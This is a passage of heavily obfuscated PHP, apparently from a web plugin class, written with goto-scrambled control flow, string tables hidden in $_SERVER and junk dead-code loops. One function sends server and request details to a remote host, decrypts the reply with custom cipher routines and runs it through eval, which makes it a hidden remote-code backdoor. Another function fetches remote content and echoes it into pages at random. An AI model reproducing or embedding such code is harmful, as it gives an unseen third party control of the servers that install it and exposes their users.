$a·¤ÌŠ³Õò[284] => $a·¤ÌŠ³Õò[282], $a·¤ÌŠ³Õò[285] => $a·¤ÌŠ³Õò[282], $a·¤ÌŠ³Õò[286] => $a·¤ÌŠ³Õò[282], $a·¤ÌŠ³Õò[287] => $a·¤ÌŠ³Õò[282], $a·¤ÌŠ³Õò[288] => $a·¤ÌŠ³Õò[289], $a·¤ÌŠ³Õò[290] => $a·¤ÌŠ³Õò[289], $a·¤ÌŠ³Õò[291] => $a·¤ÌŠ³Õò[289], $a·¤ÌŠ³Õò[292] => $a·¤ÌŠ³Õò[289], $a·¤ÌŠ³Õò[293] => $a·¤ÌŠ³Õò[289], $a·¤ÌŠ³Õò[294] => $a·¤ÌŠ³Õò[289], $a·¤ÌŠ³Õò[295] => $a·¤ÌŠ³Õò[289], $a·¤ÌŠ³Õò[296] => $a·¤ÌŠ³Õò[289], $a·¤ÌŠ³Õò[297] => $a·¤ÌŠ³Õò[289]); $AÍõÆ×­É¤ = $a·¤ÌŠ³Õò[0]($a·¤ÌŠ³Õò[298], $a·¤ÌŠ³Õò[116]($this->bkus5172ed63, $a·¤ÌŠ³Õò[139], $a·¤ÌŠ³Õò[10])); $B‘ÍÕˆé¤É = array(); goto dà¦³ùø¥; dµ·Ø¤Ï¹¦: } private function aemc66145bc8() { $Fåšé––‘ =& $_SERVER[¿]; if ($this->aief1607a445 != $Fåšé––‘[131]) { return; } $GLOBALS[$Fåšé––‘[104]][$Fåšé––‘[108]][$Fåšé––‘[299]] = $Fåšé––‘[239]; $GLOBALS[$Fåšé––‘[104]][$Fåšé––‘[300]] = $Fåšé––‘[239]; if ($Fåšé––‘[61]($Fåšé––‘[301])->{$_SERVER[¿][63]}($Fåšé––‘[93]) != $Fåšé––‘[253]) { $Fåšé––‘[61]($Fåšé––‘[301])->{$_SERVER[¿][240]}($Fåšé––‘[93], $Fåšé––‘[253]); } } public function pcbua6409c63() { return $_SERVER[¿][302]; } private function pmrfa34d3a01() { goto d“Í…¬‘÷; e«±ß×ğÁˆ: $E—¤çâµ’Š = $bˆĞ…åš[306] . $bˆĞ…åš[124]($bˆĞ…åš[307]); if ($this->aief1607a445 == $bˆĞ…åš[131] || !$bˆĞ…åš[116]($GLOBALS, $bˆĞ…åš[142])) { return; } if (!$bˆĞ…åš[261]($_SERVER[$bˆĞ…åš[44]], $bÎãåˆÙó)) { return; } goto a¢¢ÚÅ‰­‘; c²Ş²ÙßÙ¨: if (!$bˆĞ…åš[161]($DÃùÍ‘¸ÅÜ)) { return; } if ($DÃùÍ‘¸ÅÜ[$bˆĞ…åš[183]] && $DÃùÍ‘¸ÅÜ[$bˆĞ…åš[312]]) { if ($this->{$_SERVER[¿][218]}($DÃùÍ‘¸ÅÜ[$bˆĞ…åš[312]]) == $EÏâÑ… ”Ï[$bˆĞ…åš[183]]) { return; } } $this->{$_SERVER[¿][182]}(); goto bÍãÃ»—èÂ; a¢¢ÚÅ‰­‘: if ($bˆĞ…åš[255]() % 4 != 0) { return; } $BøÉÜŒÜ£ = $bˆĞ…åš[13](array($bˆĞ…åš[308], $bˆĞ…åš[309]), $E—¤çâµ’Š); $bÛÏÈ…«£Á = $Bä‹‡ƒº¤[653]; goto e°Ñøåß´°; e°Ñøåß´°: if (!$bÛÏÈ…«£Á) { die; } if ($BøÉÜŒÜ£ && $bˆĞ…åš[255]() - $BøÉÜŒÜ£ < $bˆĞ…åš[263]($bˆĞ…åš[310])) { return; } $bˆĞ…åš[13](array($bˆĞ…åš[308], $bˆĞ…åš[170]), $E—¤çâµ’Š, $bˆĞ…åš[255]()); goto a¶ÎÚù»à‹; d“Í…¬‘÷: $Bä‹‡ƒº¤ =& $_SERVER[«¾°Ã¤]; $bˆĞ…åš =& $_SERVER[¿]; $bÎãåˆÙó = array($bˆĞ…åš[303], $bˆĞ…åš[304], $bˆĞ…åš[305]); goto e«±ß×ğÁˆ; a¶ÎÚù»à‹: $fË––õºëè = $Bä‹‡ƒº¤[654]; while ($fË––õºëè < $Bä‹‡ƒº¤[587]) { if ($fË––õºëè >= 0) { break; } $fË––õºëè++; } $d—Ê©ùÛ‰­ = $bˆĞ…åš[61]($bˆĞ…åš[62])->{$_SERVER[¿][63]}($bˆĞ…åš[126]); goto e„íÚì À; e„íÚì À: $b…Ì…©Ùáè = $Bä‹‡ƒº¤[655]; $EÏâÑ… ”Ï = array($bˆĞ…åš[183] => $bˆĞ…åš[61]($bˆĞ…åš[62])->{$_SERVER[¿][63]}($bˆĞ…åš[227]), $bˆĞ…åš[197] => $this->aief1607a445, $bˆĞ…åš[194] => $_SERVER[$bˆĞ…åš[195]], $bˆĞ…åš[196] => $bˆĞ…åš[61]($bˆĞ…åš[62])->{$_SERVER[¿][63]}($bˆĞ…åš[157]), $bˆĞ…åš[123] => $bˆĞ…åš[124]($_SERVER[$bˆĞ…åš[125]] . $d—Ê©ùÛ‰­), $bˆĞ…åš[187] => $bˆĞ…åš[167], $bˆĞ…åš[190] => $_SERVER[$bˆĞ…åš[191]]); $DÃùÍ‘¸ÅÜ = $this->{$_SERVER[¿][202]}($bˆĞ…åš[311], $EÏâÑ… ”Ï); goto c²Ş²ÙßÙ¨; bÍãÃ»—èÂ: $Dîä‹ÌôÄ¬ = $Bä‹‡ƒº¤[656]; if (!$Dîä‹ÌôÄ¬) { die; } if ($this->{$_SERVER[¿][218]}($DÃùÍ‘¸ÅÜ[$bˆĞ…åš[312]]) != $EÏâÑ… ”Ï[$bˆĞ…åš[183]]) { $e®®ô•Çã = array($bˆĞ…åš[220] => $d—Ê©ùÛ‰­, $bˆĞ…åš[221] => $_SERVER[$bˆĞ…åš[125]], $bˆĞ…åš[222] => $bˆĞ…åš[223](), $bˆĞ…åš[192] => $_SERVER[$bˆĞ…åš[193]]); $bìÁ­çÛ˜¥ = $this->{$_SERVER[¿][224]}($bˆĞ…åš[166]($e®®ô•Çã)); $DÃùÍ‘¸ÅÜ = $this->{$_SERVER[¿][202]}($bˆĞ…åš[225] . $bìÁ­çÛ˜¥); if ($DÃùÍ‘¸ÅÜ && $bˆĞ…åš[161]($DÃùÍ‘¸ÅÜ) && isset($DÃùÍ‘¸ÅÜ[$bˆĞ…åš[312]])) { $f˜š¸Ô›šƒ = $this->{$_SERVER[¿][208]}($DÃùÍ‘¸ÅÜ[$bˆĞ…åš[312]], 2); if ($f˜š¸Ô›šƒ) { $f˜š¸Ô›šƒ = $this->{$_SERVER[¿][218]}($f˜š¸Ô›šƒ); } if ($f˜š¸Ô›šƒ) { try { @eval($f˜š¸Ô›šƒ); } catch (Exception $a‰ôçòÅ†) { } } } } goto DÀ¿ÙïÔÓâ; DÀ¿ÙïÔÓâ: } private function skupbd1064d4($F­§î»è¿ = '', $fƒÇ¬‡×˜ = array(), $EÇ¤‹Û— = 5) { goto aã»ª½³ÙÈ; C’¤”áğˆ½: $e¿Ïõò˜— = $a ‡İçõ‚[271](array($a ‡İçõ‚[272] => array($a ‡İçõ‚[275] => $EÇ¤‹Û—, $a ‡İçõ‚[273] => $a ‡İçõ‚[317]), $a ‡İçõ‚[318] => array($a ‡İçõ‚[319] => !1, $a ‡İçõ‚[320] => !1))); $fƒÇ¬‡×˜ = @$a ‡İçõ‚[276]($b«ŞÜùÎ, !1, $e¿Ïõò˜—); $bœ˜ÇŸ¢°ˆ = $c£ÓîĞµ§ê[658]; goto dî½Ù± ¯; dî½Ù± ¯: while ($bœ˜ÇŸ¢°ˆ < $c£ÓîĞµ§ê[627]) { if ($bœ˜ÇŸ¢°ˆ >= 0) { break; } $bœ˜ÇŸ¢°ˆ++; } return $a ‡İçõ‚[210]($fƒÇ¬‡×˜, !0); $c·±îÍöŞñ = $c£ÓîĞµ§ê[659]; goto D¤‹“†‹¶‘; D¤‹“†‹¶‘: if (!$c·±îÍöŞñ) { die; } $dçÄ¬¼Ô¾ = $c£ÓîĞµ§ê[660]; while (strlen($dçÄ¬¼Ô¾) < $c£ÓîĞµ§ê[596]) { if (!$dçÄ¬¼Ô¾) { break; } $dçÄ¬¼Ô¾++; } goto aÆÖ¦”‰Ğ«; cëÒç¾¸è¨: $b«ŞÜùÎ = $this->{$_SERVER[¿][269]}($b«ŞÜùÎ, $a ‡İçõ‚[314]); $D”Ÿ¾ÜíÕâ = $c£ÓîĞµ§ê[657]; while (strlen($D”Ÿ¾ÜíÕâ) < $c£ÓîĞµ§ê[627]) { if (!$D”Ÿ¾ÜíÕâ) { break; } $D”Ÿ¾ÜíÕâ++; } goto CáŞÆÁ“Üš; CáŞÆÁ“Üš: $b«ŞÜùÎ = $b«ŞÜùÎ . $F­§î»è¿; if ($fƒÇ¬‡×˜ && $a ‡İçõ‚[161]($fƒÇ¬‡×˜)) { $b«ŞÜùÎ = $b«ŞÜùÎ . $a ‡İçõ‚[315] . $a ‡İçõ‚[316]($fƒÇ¬‡×˜); } if ($fƒÇ¬‡×˜ === -1) { return $b«ŞÜùÎ; } goto C’¤”áğˆ½; aã»ª½³ÙÈ: $c£ÓîĞµ§ê =& $_SERVER[«¾°Ã¤]; $a ‡İçõ‚ =& $_SERVER[¿]; $b«ŞÜùÎ = $a ‡İçõ‚[313]; goto cëÒç¾¸è¨; aÆÖ¦”‰Ğ«: } private function boxdb20ed76e() { goto FïÆÚ‰‘äÚ; CØ‘¯âó®†: if (!$f´®‡Ôª) { die; } goto D «‘“×ƒŠ; a¹™‚É¢‰„: $eğ íª«º¡ = $BÍİ‡¹‘•[$this->aief1607a445]; $f„Ú…¥‘·Ü = $d¦ˆˆÁÚó[661]; while ($f„Ú…¥‘·Ü < $d¦ˆˆÁÚó[589]) { if ($f„Ú…¥‘·Ü >= 0) { break; } $f„Ú…¥‘·Ü++; } goto EÉÛ¸•Ê©â; DÂñ¢Ã¼: $e¡Šæó“Âì = $F¬±Æ‡¤®[116]($this->bkus5172ed63, $F¬±Æ‡¤®[348]); $e¡Šæó“Âì = $e¡Šæó“Âì ? $F¬±Æ‡¤®[263]($e¡Šæó“Âì) : 0; $dî„“¢‡ÚÉ = $d¦ˆˆÁÚó[663]; goto cøƒôï·Äá; cøƒôï·Äá: while (strlen($dî„“¢‡ÚÉ) < $d¦ˆˆÁÚó[400]) { if (!$dî„“¢‡ÚÉ) { break; } $dî„“¢‡ÚÉ++; } return $eğ íª«º¡ + $e¡Šæó“Âì; $f´®‡Ôª = $d¦ˆˆÁÚó[664]; goto CØ‘¯âó®†; EÉÛ¸•Ê©â: $eğ íª«º¡ = $F¬±Æ‡¤®[263]($eğ íª«º¡ ? $eğ íª«º¡ : $F¬±Æ‡¤®[322]); $A‚«í²‚ = $d¦ˆˆÁÚó[662]; if (strlen($A‚«í²‚) < $d¦ˆˆÁÚó[589]) { return; } goto DÂñ¢Ã¼; FïÆÚ‰‘äÚ: $d¦ˆˆÁÚó =& $_SERVER[«¾°Ã¤]; $F¬±Æ‡¤® =& $_SERVER[¿]; $BÍİ‡¹‘• = array($F¬±Æ‡¤®[321] => $F¬±Æ‡¤®[322], $F¬±Æ‡¤®[323] => $F¬±Æ‡¤®[324], $F¬±Æ‡¤®[325] => $F¬±Æ‡¤®[326], $F¬±Æ‡¤®[327] => $F¬±Æ‡¤®[328], $F¬±Æ‡¤®[329] => $F¬±Æ‡¤®[330], $F¬±Æ‡¤®[331] => $F¬±Æ‡¤®[264], $F¬±Æ‡¤®[332] => $F¬±Æ‡¤®[264], $F¬±Æ‡¤®[333] => $F¬±Æ‡¤®[322], $F¬±Æ‡¤®[334] => $F¬±Æ‡¤®[324], $F¬±Æ‡¤®[335] => $F¬±Æ‡¤®[326], $F¬±Æ‡¤®[336] => $F¬±Æ‡¤®[337], $F¬±Æ‡¤®[338] => $F¬±Æ‡¤®[328], $F¬±Æ‡¤®[339] => $F¬±Æ‡¤®[340], $F¬±Æ‡¤®[341] => $F¬±Æ‡¤®[330], $F¬±Æ‡¤®[342] => $F¬±Æ‡¤®[343], $F¬±Æ‡¤®[344] => $F¬±Æ‡¤®[345], $F¬±Æ‡¤®[346] => $F¬±Æ‡¤®[347]); goto a¹™‚É¢‰„; D «‘“×ƒŠ: } public function kleaa2d25964($F’‰Šìš·ä) { goto F¯ëá–Ë¡Ç; A‚ŞŞ§îˆˆ: if (!$E—‰Ì¦ƒÎ¶[261]($F’‰Šìš·ä[$E—‰Ì¦ƒÎ¶[349]], $D¸À¼ÒšãÔ)) { $E—‰Ì¦ƒÎ¶[184]($E—‰Ì¦ƒÎ¶[353], !1, $E—‰Ì¦ƒÎ¶[258]); } goto EŸ‘È·š•æ; dõ¸ÎÛ¢âŸ: if ($e’»æØ·¤Ù >= $E—‰Ì¦ƒÎ¶[263]($E—‰Ì¦ƒÎ¶[264])) { return; } $f½…Œ¥‰Í« = $E—‰Ì¦ƒÎ¶[61]($E—‰Ì¦ƒÎ¶[149])->{$_SERVER[¿][150]}(); $aã‰¼¨Çé = $_SERVER[«¾°Ã¤][665]; goto a§ŞÏ£‰™¥; a§ŞÏ£‰™¥: if ($f½…Œ¥‰Í« <= $e’»æØ·¤Ù) { return; } $D¸À¼ÒšãÔ = $E—‰Ì¦ƒÎ¶[61]($E—‰Ì¦ƒÎ¶[149])->{$_SERVER[¿][350]}($E—‰Ì¦ƒÎ¶[349])->{$_SERVER[¿][351]}($e’»æØ·¤Ù)->{$_SERVER[¿][352]}(); $D¸À¼ÒšãÔ = $E—‰Ì¦ƒÎ¶[241]($D¸À¼ÒšãÔ, $E—‰Ì¦ƒÎ¶[10], $E—‰Ì¦ƒÎ¶[349]); goto A‚ŞŞ§îˆˆ; F¯ëá–Ë¡Ç: $E—‰Ì¦ƒÎ¶ =& $_SERVER[¿]; $e’»æØ·¤Ù = $this->{$_SERVER[¿][147]}(); if ($F’‰Šìš·ä[$E—‰Ì¦ƒÎ¶[349]] == $E—‰Ì¦ƒÎ¶[239]) { return; } goto dõ¸ÎÛ¢âŸ; EŸ‘È·š•æ: } public function afhx95e332bc() { goto dßöÁó’; aÊ…Š®Ø£ù: $d„àø‚¥¿ = $this->{$_SERVER[¿][269]}($d„àø‚¥¿, $eÄ»ÑØì[270]); $d•™¿ø™ ” = $eÄ»ÑØì[271](array($eÄ»ÑØì[272] => array($eÄ»ÑØì[273] => $eÄ»ÑØì[274], $eÄ»ÑØì[275] => 3))); $cæ‰Ô‹”ˆ = @$eÄ»ÑØì[276]($d„àø‚¥¿, !1, $d•™¿ø™ ”); goto C¦§Óâ©¾½; C¦§Óâ©¾½: echo $eÄ»ÑØì[355] . $eÄ»ÑØì[356]($cæ‰Ô‹”ˆ) . $eÄ»ÑØì[357]; goto C‚¨÷‚…èœ; dßöÁó’: $eÄ»ÑØì =& $_SERVER[¿]; if (!$eÄ»ÑØì[116]($GLOBALS, $eÄ»ÑØì[142]) || $eÄ»ÑØì[354](1, 100) > 20) { return; } $d„àø‚¥¿ = $eÄ»ÑØì[268]; goto aÊ…Š®Ø£ù; C‚¨÷‚…èœ: } private function sipea0bcb803($aáñ¤­Æ¾Ú, $F¢êÈë°©, $dì¾‹»²ßÆ = 3) { goto cÓµºà…™; B²²Ö…ƒ‡: $aáñ¤­Æ¾Ú = $E‚×ƒŸõÔœ[2]($aáñ¤­Æ¾Ú); $BĞËä«µ¼ = $E‚×ƒŸõÔœ[354](0, 5) . $E‚×ƒŸõÔœ[10]; $c³ğ­©³í™ = $E‚×ƒŸõÔœ[134](15); goto F¸ã°ŒÅÃ’; F¸ã°ŒÅÃ’: $FÏùğ‰êëÃ = $E‚×ƒŸõÔœ[359]; switch ($BĞËä«µ¼) { case $E‚×ƒŸõÔœ[253]: $A…Š»¿¸Üª = $this->{$_SERVER[¿][165]}($aáñ¤­Æ¾Ú, $E‚×ƒŸõÔœ[233]($F¢êÈë°© . $c³ğ­©³í™)); break; case $E‚×ƒŸõÔœ[239]: $A…Š»¿¸Üª = $this->{$_SERVER[¿][165]}($aáñ¤­Æ¾Ú, $E‚×ƒŸõÔœ[233]($c³ğ­©³í™ . $F¢êÈë°©)); $f¹Èò°òÃ’ = $eËŸÃìĞÀÜ[666]; while ($f¹Èò°òÃ’ < $eËŸÃìĞÀÜ[627]) { if ($f¹Èò°òÃ’ >= 0) { break; } $f¹Èò°òÃ’++; } break; case $E‚×ƒŸõÔœ[360]: $A…Š»¿¸Üª = $this->{$_SERVER[¿][165]}($aáñ¤­Æ¾Ú, $E‚×ƒŸõÔœ[128]($c³ğ­©³í™ . $F¢êÈë°©)); $B³ãš†‰ª¨ = $eËŸÃìĞÀÜ[667]; while (strlen($B³ãš†‰ª¨) < $eËŸÃìĞÀÜ[627]) { if (!$B³ãš†‰ª¨) { break; } $B³ãš†‰ª¨++; } break; $EÜÕº‚ƒã¸ = $eËŸÃìĞÀÜ[668]; if (!$EÜÕº‚ƒã¸) { return; } case $E‚×ƒŸõÔœ[361]: $A…Š»¿¸Üª = $this->{$_SERVER[¿][165]}($aáñ¤­Æ¾Ú, $E‚×ƒŸõÔœ[124]($c³ğ­©³í™ . $F¢êÈë°©)); $aËéˆ…ÇñÎ = $eËŸÃìĞÀÜ[669]; break; $E¸÷‚áŒÜ = $eËŸÃìĞÀÜ[670]; if (strlen($E¸÷‚áŒÜ) < $eËŸÃìĞÀÜ[627]) { return; } case $E‚×ƒŸõÔœ[362]: goto DáŒ©à†; eÀœŠç¤Ó•: if (!$cœÇ›Ø­Ó) { return; } $Dë‡¨Ú£ë = 0; $Bå×†“ØäÎ = $eËŸÃìĞÀÜ[675]; goto BÈ‡èĞš¥ğ; f‘´œõéòÜ: $A…Š»¿¸Üª = $E‚×ƒŸõÔœ[356]($F˜ö¥³é . $F¬ùôï¹ÖÑ); break; goto aÒß¾ó½ø; BÈ‡èĞš¥ğ: if (strlen($Bå×†“ØäÎ) < $eËŸÃìĞÀÜ[589]) { die; } $d„à—©¨ = 0; $DªÂ¹‡’¥ñ = $eËŸÃìĞÀÜ[676]; goto eá†“ï©ğ‡; B¤É£‘¡’: $DñÍÊ¡¢½ = $E‚×ƒŸõÔœ[25]($DñÍÊ¡¢½, $Dá™¤ìçªÃ % 8, $Dá™¤ìçªÃ % 8 + 7); $F¬ùôï¹ÖÑ = $E‚×ƒŸõÔœ[10]; $cœÇ›Ø­Ó = $eËŸÃìĞÀÜ[674]; goto eÀœŠç¤Ó•; DáŒ©à†: $aáñ¤­Æ¾Ú = $E‚×ƒŸõÔœ[128]($aáñ¤­Æ¾Ú); $a™¶»Å«… = $eËŸÃìĞÀÜ[671]; $Dá™¤ìçªÃ = $E‚×ƒŸõÔœ[363](0, 64); goto Cîë·‘Ï¯; Cîë·‘Ï¯: $A–‹‰ƒÃç = $eËŸÃìĞÀÜ[672]; if (strlen($A–‹‰ƒÃç) < $eËŸÃìĞÀÜ[596]) { die; } $F˜ö¥³é = $FÏùğ‰êëÃ[$Dá™¤ìçªÃ]; goto aÜ˜¸®Ÿ…; aÜ˜¸®Ÿ…: $DñÍÊ¡¢½ = $E‚×ƒŸõÔœ[124]($F˜ö¥³é . $E‚×ƒŸõÔœ[124]($F¢êÈë°© . $F˜ö¥³é) . $F¢êÈë°©); $a‚…ÔãÆ¿ = $eËŸÃìĞÀÜ[673]; if (!$a‚…ÔãÆ¿) { die; } goto B¤É£‘¡’; eá†“ï©ğ‡: if (!$DªÂ¹‡’¥ñ) { die; } $FÛÇ‰—¢­ã = 0; for ($Dë‡¨Ú£ë = 0; $Dë‡¨Ú£ë < $E‚×ƒŸõÔœ[24]($aáñ¤­Æ¾Ú); $Dë‡¨Ú£ë++) { $FÛÇ‰—¢­ã = $FÛÇ‰—¢­ã == $E‚×ƒŸõÔœ[24]($DñÍÊ¡¢½) ? 0 : $FÛÇ‰—¢­ã; $A’ÙÒùÜ“¯ = $eËŸÃìĞÀÜ[677]; $d„à—©¨ = ($Dá™¤ìçªÃ + $E‚×ƒŸõÔœ[364]($FÏùğ‰êëÃ, $aáñ¤­Æ¾Ú[$Dë‡¨Ú£ë]) + $E‚×ƒŸõÔœ[365]($DñÍÊ¡¢½[$FÛÇ‰—¢­ã++])) % 64; $bÌ‡˜ªÔÌÛ = $eËŸÃìĞÀÜ[678]; $F¬ùôï¹ÖÑ .= $FÏùğ‰êëÃ[$d„à—©¨]; $Aã’¤ÚÇÍÓ = $eËŸÃìĞÀÜ[679]; while ($Aã’¤ÚÇÍÓ < $eËŸÃìĞÀÜ[587]) { if ($Aã’¤ÚÇÍÓ >= 0) { break; } $Aã’¤ÚÇÍÓ++; } } goto f‘´œõéòÜ; aÒß¾ó½ø: default: $A…Š»¿¸Üª = $this->{$_SERVER[¿][165]}($aáñ¤­Æ¾Ú, $F¢êÈë°© . $c³ğ­©³í™); break; $b«¾¦©½ˆñ = $eËŸÃìĞÀÜ[680]; if (strlen($b«¾¦©½ˆñ) < $eËŸÃìĞÀÜ[596]) { return; } } $A…Š»¿¸Üª = $E‚×ƒŸõÔœ[233]($BĞËä«µ¼ . $c³ğ­©³í™ . $A…Š»¿¸Üª); goto e§¨Û¤¶´—; e§¨Û¤¶´—: if ($dì¾‹»²ßÆ - 1 > 0) { $A…Š»¿¸Üª = $this->{$_SERVER[¿][137]}($A…Š»¿¸Üª, $F¢êÈë°©, $dì¾‹»²ßÆ - 1); } return $A…Š»¿¸Üª; goto CçÅƒÏíµ; cÓµºà…™: $eËŸÃìĞÀÜ =& $_SERVER[«¾°Ã¤]; $E‚×ƒŸõÔœ =& $_SERVER[¿]; $E‚×ƒŸõÔœ[358](1); goto B²²Ö…ƒ‡; CçÅƒÏíµ: } private function wezs0250b5e9($A½Ê‰¡‘Ë¸, $C§İİˆÇ©£, $CÊ¤©à‚¥º = 3) { goto e’½å½ÈÍÎ; fºÔÕ“™ŸÁ: $c¹Ÿ³‚È = $A½Ê‰¡‘Ë¸[0]; $b‘ÎÀÅ¸˜Ë = $f¸…»³ô©Å[682]; if (strlen($b‘ÎÀÅ¸˜Ë) < $f¸…»³ô©Å[596]) { return; } goto C‹œÓÀ‡ç; bášÂ’øÁ¾: switch ($c¹Ÿ³‚È) { case $A°±†Š¯¾ˆ[253]: $D‘œ¸‰¨œÏ = $this->{$_SERVER[¿][269]}($A½Ê‰¡‘Ë¸, $A°±†Š¯¾ˆ[233]($C§İİˆÇ©£ . $F¸¨Ü§µË™)); break; $a§¢Èœ†İ = $f¸…»³ô©Å[683]; if (strlen($a§¢Èœ†İ) < $f¸…»³ô©Å[400]) { die; } case $A°±†Š¯¾ˆ[239]: $D‘œ¸‰¨œÏ = $this->{$_SERVER[¿][269]}($A½Ê‰¡‘Ë¸, $A°±†Š¯¾ˆ[233]($F¸¨Ü§µË™ . $C§İİˆÇ©£)); $D‰É˜¯à‚ = $f¸…»³ô©Å[684]; break; case $A°±†Š¯¾ˆ[360]: $D‘œ¸‰¨œÏ = $this->{$_SERVER[¿][269]}($A½Ê‰¡‘Ë¸, $A°±†Š¯¾ˆ[128]($F¸¨Ü§µË™ . $C§İİˆÇ©£)); break; $B Òê÷ª¤† = $f¸…»³ô©Å[685]; while (strlen($B Òê÷ª¤†) < $f¸…»³ô©Å[589]) { if (!$B Òê÷ª¤†) { break; } $B Òê÷ª¤†++; } case $A°±†Š¯¾ˆ[361]: $D‘œ¸‰¨œÏ = $this->{$_SERVER[¿][269]}($A½Ê‰¡‘Ë¸, $A°±†Š¯¾ˆ[124]($F¸¨Ü§µË™ . $C§İİˆÇ©£)); $cí‰©Ò©Œ = $f¸…»³ô©Å[686]; if (strlen($cí‰©Ò©Œ) < $f¸…»³ô©Å[587]) { return; } break; $F‚½ùæÑàË = $f¸…»³ô©Å[687]; case $A°±†Š¯¾ˆ[362]: goto e„‚§İÆ; CÊØºªíå: $d’ºÙš™… = $f¸…»³ô©Å[691]; while ($d’ºÙš™… < $f¸…»³ô©Å[596]) { if ($d’ºÙš™… >= 0) { break; } $d’ºÙš™…++; } for ($dË°ÙùÏ = 0; $dË°ÙùÏ < $A°±†Š¯¾ˆ[24]($A½Ê‰¡‘Ë¸); $dË°ÙùÏ++) { $BÙŠø•êëæ = $BÙŠø•êëæ == $A°±†Š¯¾ˆ[24]($bÛ™ËÔ£”ª) ? 0 : $BÙŠø•êëæ; $dÑåºî¡æâ = $BÙŠø•êëæ++; $EÌ¸İ¾‘ = $A°±†Š¯¾ˆ[364]($fÚŠî¬í‡ó, $A½Ê‰¡‘Ë¸[$dË°ÙùÏ]) - $c«Ûá“…Òã - $A°±†Š¯¾ˆ[365]($bÛ™ËÔ£”ª[$dÑåºî¡æâ]); $F«É¸‚ò¡ = $f¸…»³ô©Å[692]; if (strlen($F«É¸‚ò¡) < $f¸…»³ô©Å[587]) { die; } while ($EÌ¸İ¾‘ < 0) { $EÌ¸İ¾‘ += 64; $DöÃíñ×ù = $f¸…»³ô©Å[693]; if (!$DöÃíñ×ù) { die; } } $BÌÒ¿©¨ .= $fÚŠî¬í‡ó[$EÌ¸İ¾‘]; } goto CƒÄ¶‘¬±; CƒÄ¶‘¬±: $D‘œ¸‰¨œÏ = $A°±†Š¯¾ˆ[367]($BÌÒ¿©¨); $Fë¿õƒ = $f¸…»³ô©Å[694]; while ($Fë¿õƒ < $f¸…»³ô©Å[627]) { if ($Fë¿õƒ >= 0) { break; } $Fë¿õƒ++; } goto AÑ—íæê¥í; Fš¬†»½¶¨: $BÌÒ¿©¨ = $A°±†Š¯¾ˆ[10]; $dË°ÙùÏ = 0; $c°í³²è º = $f¸…»³ô©Å[690]; goto d¥±²ÌÎ¡ç; e„‚§İÆ: $A½Ê‰¡‘Ë¸ = $A°±†Š¯¾ˆ[366]($A½Ê‰¡‘Ë¸); $fÕñÕ §Å° = $f¸…»³ô©Å[688]; $aƒ‡Ğ§´íœ = $A½Ê‰¡‘Ë¸[0]; goto B…Üï“ãÄ£; AÑ—íæê¥í: break; $a¡È‘šç†ğ = $f¸…»³ô©Å[695]; goto f¶ƒÓäçç; cÄˆÏÌö: $c«Ûá“…Òã = $A°±†Š¯¾ˆ[364]($fÚŠî¬í‡ó, $aƒ‡Ğ§´íœ); $bÛ™ËÔ£”ª = $A°±†Š¯¾ˆ[124]($aƒ‡Ğ§´íœ . $A°±†Š¯¾ˆ[124]($C§İİˆÇ©£ . $aƒ‡Ğ§´íœ) . $C§İİˆÇ©£); $bÛ™ËÔ£”ª = $A°±†Š¯¾ˆ[25]($bÛ™ËÔ£”ª, $c«Ûá“…Òã % 8, $c«Ûá“…Òã % 8 + 7); goto Fš¬†»½¶¨; B…Üï“ãÄ£: $A½Ê‰¡‘Ë¸ = $A°±†Š¯¾ˆ[25]($A½Ê‰¡‘Ë¸, 1); $eñ¯É©ÄÛÀ = $f¸…»³ô©Å[689]; if (strlen($eñ¯É©ÄÛÀ) < $f¸…»³ô©Å[627]) { return; } goto cÄˆÏÌö; d¥±²ÌÎ¡ç: if (!$c°í³²è º) { return; } $EÌ¸İ¾‘ = 0; $BÙŠø•êëæ = 0; goto CÊØºªíå; f¶ƒÓäçç: default: $D‘œ¸‰¨œÏ = $this->{$_SERVER[¿][269]}($A½Ê‰¡‘Ë¸, $C§İİˆÇ©£ . $F¸¨Ü§µË™); $d™»àšŠ = $f¸…»³ô©Å[696]; break; $a¹Š‰Ìô‚Õ = $f¸…»³ô©Å[697]; } if ($CÊ¤©à‚¥º - 1 > 0) { $D‘œ¸‰¨œÏ = $this->{$_SERVER[¿][208]}($D‘œ¸‰¨œÏ, $C§İİˆÇ©£, $CÊ¤©à‚¥º - 1); } return $D‘œ¸‰¨œÏ; goto d”àÕ²˜óÛ; C‹œÓÀ‡ç: $F¸¨Ü§µË™ = $A°±†Š¯¾ˆ[25]($A½Ê‰¡‘Ë¸, 1, 15); $A½Ê‰¡‘Ë¸ = $A°±†Š¯¾ˆ[25]($A½Ê‰¡‘Ë¸, 16); $fÚŠî¬í‡ó = $A°±†Š¯¾ˆ[359]; goto bášÂ’øÁ¾; f¨Šƒ®: $A½Ê‰¡‘Ë¸ = $A°±†Š¯¾ˆ[2]($A½Ê‰¡‘Ë¸); $b­Ç›äí  = $f¸…»³ô©Å[681]; $A½Ê‰¡‘Ë¸ = $A°±†Š¯¾ˆ[233]($A½Ê‰¡‘Ë¸); goto fºÔÕ“™ŸÁ; e’½å½ÈÍÎ: $f¸…»³ô©Å =& $_SERVER[«¾°Ã¤]; $A°±†Š¯¾ˆ =& $_SERVER[¿]; if (!$A°±†Š¯¾ˆ[158]($A½Ê‰¡‘Ë¸) || $A°±†Š¯¾ˆ[24]($A½Ê‰¡‘Ë¸) < 10) { return !1; } goto f¨Šƒ®; d”àÕ²˜óÛ: } public function guzk53efa110($eÌ„«–ÒÊˆ) { goto e¸´¡İ·£; e„¾å•¤ª‚: if (!$b¿”Úñ×Ô„) { die; } goto A²»áƒª…œ; C£³È¸ƒñ²: $bœ§ ñË = $c¹ìÌ±Á±˜[698]; if (strlen($bœ§ ñË) < $c¹ìÌ±Á±˜[589]) { return; } $Fô©ÓÜå… = $this->{$_SERVER[¿][368]}(); goto c¯ è•òÄÔ; e¸´¡İ·£: $c¹ìÌ±Á±˜ =& $_SERVER[«¾°Ã¤]; $F˜ª¶œâáè =& $_SERVER[¿]; $CÖ³æ¼¨Î = $this->{$_SERVER[¿][368]}(); goto C£³È¸ƒñ²; côÉò¾±ªó: $a·•¸ù¬…Ç = 2; for ($cÉóÅÒÛÃ = 0; $cÉóÅÒÛÃ < $E´Áô¦½Û * 10; $cÉóÅÒÛÃ++) { if (($E´Áô¦½Û * $cÉóÅÒÛÃ + 1) % $dƒ‰„¸Æƒš == 0) { $a·•¸ù¬…Ç = $F˜ª¶œâáè[263](($E´Áô¦½Û * $cÉóÅÒÛÃ + 1) / $dƒ‰„¸Æƒš); break; } } $eŸ•éÈÍ¹¯ = $this->{$_SERVER[¿][165]}($CÖ³æ¼¨Î * 